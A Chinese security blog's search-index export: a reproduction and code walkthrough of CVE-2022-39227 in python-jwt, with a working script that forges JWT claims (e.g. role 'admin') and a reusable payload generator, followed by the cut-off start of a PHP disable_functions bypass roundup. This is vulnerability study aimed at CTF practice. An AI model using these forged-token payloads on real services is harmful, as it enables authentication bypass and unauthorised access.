<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python-JWT身份验证绕过复现(CVE-2022-39227)</title>
    <url>/LtmThink/2024/01/03/Python-JWT%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87(CVE-2022-39227)/</url>
    <content><![CDATA[<h4 id="介绍">介绍:</h4>
<p>python-jwt库中的verify_jwt()存在身份验证绕过漏洞</p>
<h4 id="版本">版本:</h4>
<p>python-jwt &lt; 3.3.4</p>
<h4 id="漏洞分析">漏洞分析:</h4>
<p>环境搭建:pip install python-jwt == 3.3.3</p>
<p>以 以下的复现代码为例分析漏洞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jwcrypto <span class="keyword">import</span> jwk</span><br><span class="line"></span><br><span class="line"><span class="comment">#jwt载荷主体</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;role&#x27;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line"><span class="comment">#256位密钥生成</span></span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;oct&#x27;</span>, size=<span class="number">256</span>)</span><br><span class="line"><span class="comment">#生成jwt以HS256加密签名</span></span><br><span class="line">jwt_json = generate_jwt(payload, key, <span class="string">&#x27;HS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line"><span class="comment">###以下部分为payload生成###</span></span><br><span class="line">[header, payload, signature] = jwt_json.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment">#把python数组转化为json数据,并base64加密</span></span><br><span class="line">fake = base64url_encode(dumps(parsed_payload))</span><br><span class="line"><span class="comment">#构造一个绕过的json形式的payload,这是关键下面会分析</span></span><br><span class="line">fake_jwt = <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(fake_jwt)</span><br><span class="line">token = verify_jwt(fake_jwt, key, [<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line"><span class="comment">#成功绕过打印结果</span></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401031115828.png" alt="imgs/202401031115828.png"></p>
<h5 id="1-进入验证返回函数verify-jwt">1.进入验证返回函数verify_jwt</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_jwt</span>(<span class="params">jwt,</span></span><br><span class="line"><span class="params">               pub_key=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">               allowed_algs=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">               iat_skew=timedelta(<span class="params"></span>),</span></span><br><span class="line"><span class="params">               checks_optional=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">               ignore_not_implemented=<span class="literal">False</span></span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> allowed_algs <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        allowed_algs = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(allowed_algs, <span class="built_in">list</span>):</span><br><span class="line">        <span class="comment"># jwcrypto only supports list of allowed algorithms</span></span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;allowed_algs must be a list&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    header, claims, _ = jwt.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parsed_header = json_decode(base64url_decode(header))</span><br><span class="line"></span><br><span class="line">    alg = parsed_header.get(<span class="string">&#x27;alg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> alg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;alg header not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> alg <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;algorithm not allowed: &#x27;</span> + alg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ignore_not_implemented:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> parsed_header:</span><br><span class="line">            <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> JWSHeaderRegistry:</span><br><span class="line">                <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;unknown header: &#x27;</span> + k)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> JWSHeaderRegistry[k].supported:</span><br><span class="line">                <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;header not implemented: &#x27;</span> + k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pub_key:</span><br><span class="line">        token = JWS()</span><br><span class="line">        token.allowed_algs = allowed_algs</span><br><span class="line">        token.deserialize(jwt, pub_key)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;none&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;no key but none alg not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parsed_claims = json_decode(base64url_decode(claims))</span><br><span class="line"></span><br><span class="line">    utcnow = datetime.utcnow()</span><br><span class="line">    now = timegm(utcnow.utctimetuple())</span><br><span class="line"></span><br><span class="line">    typ = parsed_header.get(<span class="string">&#x27;typ&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> typ != <span class="string">&#x27;JWT&#x27;</span>:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header is not JWT&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    iat = parsed_claims.get(<span class="string">&#x27;iat&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> iat <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;iat claim not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> iat &gt; timegm((utcnow + iat_skew).utctimetuple()):</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;issued in the future&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    nbf = parsed_claims.get(<span class="string">&#x27;nbf&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> nbf <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;nbf claim not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> nbf &gt; now:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;not yet valid&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    exp = parsed_claims.get(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> exp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">            <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;exp claim not present&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> exp &lt;= now:</span><br><span class="line">        <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;expired&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parsed_header, parsed_claims</span><br></pre></td></tr></table></figure>
<p>逐段对函数verify_jwt()进行分析</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>首先验证传入的allowed_algs(指定的签名验证算法)是否合规</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#传入的allowed_algs校验</span></span><br><span class="line"><span class="keyword">if</span> allowed_algs <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    allowed_algs = []</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(allowed_algs, <span class="built_in">list</span>):</span><br><span class="line">    <span class="comment"># jwcrypto only supports list of allowed algorithms</span></span><br><span class="line">    <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;allowed_algs must be a list&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>接着将传入的要验证的jwt根据.号分为三段分别存储,并将第一段header通过base64解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将传入的jwt分为三段</span></span><br><span class="line">header, claims, _ = jwt.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_header = json_decode(base64url_decode(header))</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>接着验证header中存储相关信息是否合规(alg指定的签名验证算法是否和allowed_algs中指定的是否一致等)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#header头合规验证</span></span><br><span class="line">alg = parsed_header.get(<span class="string">&#x27;alg&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> alg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;alg header not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> alg <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;algorithm not allowed: &#x27;</span> + alg)</span><br><span class="line">  </span><br><span class="line"> <span class="keyword">if</span> <span class="keyword">not</span> ignore_not_implemented:</span><br><span class="line">     <span class="keyword">for</span> k <span class="keyword">in</span> parsed_header:</span><br><span class="line">         <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> JWSHeaderRegistry:</span><br><span class="line">             <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;unknown header: &#x27;</span> + k)</span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> JWSHeaderRegistry[k].supported:</span><br><span class="line">             <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;header not implemented: &#x27;</span> + k)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p><mark>接着对签名进行验证</mark></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#token.deserialize进行签名验证</span></span><br><span class="line"><span class="keyword">if</span> pub_key:</span><br><span class="line">       token = JWS()</span><br><span class="line">       token.allowed_algs = allowed_algs</span><br><span class="line">       token.deserialize(jwt, pub_key)</span><br><span class="line">   <span class="keyword">elif</span> <span class="string">&#x27;none&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> allowed_algs:</span><br><span class="line">       <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;no key but none alg not allowed&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>如果签名验证成功无错误返回,则将jwt载荷(payload)解码传给parsed_claims(后续会将parsed_claims返回作为得到的成功验证的信息)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parsed_claims = json_decode(base64url_decode(claims))</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>对jwt载荷中的其他信息进行判断(如是否超过jwt有效时间等)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utcnow = datetime.utcnow()</span><br><span class="line"> now = timegm(utcnow.utctimetuple())</span><br><span class="line">  </span><br><span class="line"> typ = parsed_header.get(<span class="string">&#x27;typ&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> typ != <span class="string">&#x27;JWT&#x27;</span>:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;typ header is not JWT&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"> iat = parsed_claims.get(<span class="string">&#x27;iat&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> iat <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;iat claim not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> iat &gt; timegm((utcnow + iat_skew).utctimetuple()):</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;issued in the future&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"> nbf = parsed_claims.get(<span class="string">&#x27;nbf&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> nbf <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;nbf claim not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> nbf &gt; now:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;not yet valid&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"> exp = parsed_claims.get(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line"> <span class="keyword">if</span> exp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> checks_optional:</span><br><span class="line">         <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;exp claim not present&#x27;</span>)</span><br><span class="line"> <span class="keyword">elif</span> exp &lt;= now:</span><br><span class="line">     <span class="keyword">raise</span> _JWTError(<span class="string">&#x27;expired&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>最后返回成功结果:解码过的jwt header和jwt 载荷(payload)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> parsed_header, parsed_claims</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="2-token-deserialize-方法分析">2.token.deserialize()方法分析</h5>
<p>对于一个传入的jwt,我们要使其通过验证,必须要使token.deserialize()验证通过。我们来看token.deserialize()的验证过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deserialize</span>(<span class="params">self, raw_jws, key=<span class="literal">None</span>, alg=<span class="literal">None</span></span>):</span><br><span class="line">       self.objects = &#123;&#125;</span><br><span class="line">       o = &#123;&#125;</span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               djws = json_decode(raw_jws)</span><br><span class="line">               <span class="keyword">if</span> <span class="string">&#x27;signatures&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">                   o[<span class="string">&#x27;signatures&#x27;</span>] = []</span><br><span class="line">                   <span class="keyword">for</span> s <span class="keyword">in</span> djws[<span class="string">&#x27;signatures&#x27;</span>]:</span><br><span class="line">                       os = self._deserialize_signature(s)</span><br><span class="line">                       o[<span class="string">&#x27;signatures&#x27;</span>].append(os)</span><br><span class="line">                       self._deserialize_b64(o, os.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   o = self._deserialize_signature(djws)</span><br><span class="line">                   self._deserialize_b64(o, o.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> <span class="string">&#x27;payload&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">                   <span class="keyword">if</span> o.get(<span class="string">&#x27;b64&#x27;</span>, <span class="literal">True</span>):</span><br><span class="line">                       o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(djws[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">                   <span class="keyword">else</span>:</span><br><span class="line">                       o[<span class="string">&#x27;payload&#x27;</span>] = djws[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line"></span><br><span class="line">           <span class="keyword">except</span> ValueError:</span><br><span class="line">               c = raw_jws.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">               <span class="keyword">if</span> <span class="built_in">len</span>(c) != <span class="number">3</span>:</span><br><span class="line">                   <span class="keyword">raise</span> InvalidJWSObject(<span class="string">&#x27;Unrecognized&#x27;</span></span><br><span class="line">                                          <span class="string">&#x27; representation&#x27;</span>) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line">               p = base64url_decode(<span class="built_in">str</span>(c[<span class="number">0</span>]))</span><br><span class="line">               <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="number">0</span>:</span><br><span class="line">                   o[<span class="string">&#x27;protected&#x27;</span>] = p.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                   self._deserialize_b64(o, o[<span class="string">&#x27;protected&#x27;</span>])</span><br><span class="line">               o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">1</span>]))</span><br><span class="line">               o[<span class="string">&#x27;signature&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">           self.objects = o</span><br><span class="line"></span><br><span class="line">       <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  <span class="comment"># pylint: disable=broad-except</span></span><br><span class="line">           <span class="keyword">raise</span> InvalidJWSObject(<span class="string">&#x27;Invalid format&#x27;</span>) <span class="keyword">from</span> e</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> key:</span><br><span class="line">           self.verify(key, alg)</span><br></pre></td></tr></table></figure>
<p>逐段分析代码</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>首先通过json_decode()方法对传入的raw_jws分别分为是json数据和不是json数据分别处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    djws = json_decode(raw_jws)</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
<p>注意:我们可以看到这里通过try… except ValueError对数据进行分流处理,如果传入的不是json数据就会通过except ValueError下的语句处理</p>
</li>
<li class="lvl-2">
<p>第一种不是json数据的处理流程</p>
<p>将raw_jws根据.分段,如果分段数不为3段则报错(也就是不是正常的jwt形式)</p>
<p>然后将raw_jwt的三段数据(也就是头部,载荷,签证三部分)赋给数组o</p>
<p>再将数组o赋给self.objects</p>
<p>通过self.verify(key, alg)验证签证正确性key指的是加密密钥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        c = raw_jws.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(c) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">raise</span> InvalidJWSObject(<span class="string">&#x27;Unrecognized&#x27;</span></span><br><span class="line">                                   <span class="string">&#x27; representation&#x27;</span>) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line">        p = base64url_decode(<span class="built_in">str</span>(c[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="number">0</span>:</span><br><span class="line">            o[<span class="string">&#x27;protected&#x27;</span>] = p.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            self._deserialize_b64(o, o[<span class="string">&#x27;protected&#x27;</span>])</span><br><span class="line">        o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">1</span>]))</span><br><span class="line">        o[<span class="string">&#x27;signature&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(c[<span class="number">2</span>]))</span><br><span class="line">  </span><br><span class="line">    self.objects = o</span><br><span class="line">    ....</span><br><span class="line"><span class="keyword">if</span> key:</span><br><span class="line">    self.verify(key, alg)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>第二种json数据的处理流程</p>
<p>与第一种类似不过这次不用通过raw_jws.split(‘.’)分割,直接根据索引赋值头部,载荷,签证三部分给数组o</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        djws = json_decode(raw_jws)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;signatures&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">            o[<span class="string">&#x27;signatures&#x27;</span>] = []</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> djws[<span class="string">&#x27;signatures&#x27;</span>]:</span><br><span class="line">                os = self._deserialize_signature(s)</span><br><span class="line">                o[<span class="string">&#x27;signatures&#x27;</span>].append(os)</span><br><span class="line">                self._deserialize_b64(o, os.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            o = self._deserialize_signature(djws)</span><br><span class="line">            self._deserialize_b64(o, o.get(<span class="string">&#x27;protected&#x27;</span>))</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;payload&#x27;</span> <span class="keyword">in</span> djws:</span><br><span class="line">            <span class="keyword">if</span> o.get(<span class="string">&#x27;b64&#x27;</span>, <span class="literal">True</span>):</span><br><span class="line">                o[<span class="string">&#x27;payload&#x27;</span>] = base64url_decode(<span class="built_in">str</span>(djws[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                o[<span class="string">&#x27;payload&#x27;</span>] = djws[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line"><span class="keyword">if</span> key:</span><br><span class="line">    self.verify(key, alg)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="3-最终利用">3.最终利用</h5>
<p>事实上verify_jwt()中将jwt根据.号划分成三段的做法 和 token.deserialize()方法的第二种处理jwt的方式结合会出现身份验证绕过漏洞</p>
<p>思路如下:</p>
<ol>
<li class="lvl-3">
<p>传入一个json形式的数据,根据正确的jwt伪造protected、payload、signatures键值对,从而成功通过token.deserialize()对签名正确的验证</p>
</li>
<li class="lvl-3">
<p>再创造一个键值对,键名为我们自定义伪造的jwt,因为verify_jwt()中将jwt根据.号划分成三段的粗暴做法</p>
<p>我们可以使得最终通过<code>return parsed_header, parsed_claims</code>返回的结果为我们想要的</p>
</li>
</ol>
<p>复现代码中生成的payload就是这种形式的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_jwt = <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(fake_jwt)</span><br></pre></td></tr></table></figure>
<p>print(fake_jwt)输出类似为以下形式</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOiAxNzAwMDYxNTgzLCAiaWF0IjogMTcwMDA1Nzk4MywgImp0aSI6ICJPdjYwNzVlaTZiS3BVVnE0YzE0b3F3IiwgIm5iZiI6IDE3MDAwNTc5ODMsICJyb2xlIjogImkgYW0gbm90IGd1ZXN0In0.&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;protected&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot;</span><span class="punctuation">,</span> </span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJleHAiOjE3MDAwNjE1ODMsImlhdCI6MTcwMDA1Nzk4MywianRpIjoiT3Y2MDc1ZWk2YktwVVZxNGMxNG9xdyIsIm5iZiI6MTcwMDA1Nzk4Mywicm9sZSI6Imd1ZXN0In0&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span><span class="string">&quot;1cdkqIg3xvum-VlPBYG4V38o9zJsfBlCAoTjRRSqz0Q&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改以下复现代码可以得到通用的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jwcrypto <span class="keyword">import</span> jwk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jwt_json = <span class="string">&quot;获取到的jwt&quot;</span></span><br><span class="line">[header, payload, signature] = jwt_json.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_payload = loads(base64url_decode(payload))</span><br><span class="line"><span class="comment">#这里键值对根据需要修改</span></span><br><span class="line">parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;i am not guest&quot;</span></span><br><span class="line">fake = base64url_encode(dumps(parsed_payload))</span><br><span class="line">fake_jwt = <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(fake_jwt)</span><br></pre></td></tr></table></figure>
<h5 id="一个小细节">一个小细节:</h5>
<p>上面说到</p>
<p>创造一个键值对,键名为我们自定义伪造的jwt,verify_jwt()会将jwt根据.号划分成三段,再将第一段和第二段分别通过base64url_decode()解码赋给parsed_header和 parsed_claims返回。</p>
<p>而我们构造的出来的payload的第一段是含有<code>&#123;“</code>,那么解析不会出错吗</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401012029071.png" alt="image-20231115223308809"></p>
<p>事实上这是没问题的我们看一下关于base64url_decode()的介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64url_decode()是一个用于解码Base64 URL安全编码的函数。</span><br><span class="line">Base64 URL安全编码将标准的Base64编码进行了一些修改，以便在URL中传输时不会产生冲突。</span><br><span class="line">具体而言，它使用&quot;-“替换”+“，使用”_“替换”/“，并且将结尾的”=&quot;去除，并且会忽略掉不是base64的字符。</span><br></pre></td></tr></table></figure>
<p>显然<code>&#123;”</code>不是base64字符base64url_decode()会自动将其去掉</p>
<h4 id="相关题目">相关题目:</h4>
<h5 id="1-Newstar2023-Week5-Ye’s-Pickle">1.Newstar2023 Week5  Ye’s Pickle</h5>
<h5 id="2-2022祥云杯-FunWEB">2.2022祥云杯 FunWEB</h5>
]]></content>
      <categories>
        <category>CVE复现</category>
      </categories>
      <tags>
        <tag>CVE复现</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>php disable_functions绕过汇总</title>
    <url>/LtmThink/2024/03/08/disable_functions%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h4 id="1-黑名单爆破">1.黑名单爆破</h4>
<p>介绍:利用编写的脚本爆破disable_functions未禁用的函数</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817395.png" alt=""></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在php_function里更新利用函数</p>
</li>
<li class="lvl-2">
<p>在disable_function里放入通过phpinfo得到的禁用函数</p>
</li>
</ul>
<h4 id="2-利用iconv">2.利用iconv</h4>
<p>利用条件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux 操作系统</p>
</li>
<li class="lvl-2">
<p><code>putenv</code>设置环境变量可用</p>
</li>
<li class="lvl-2">
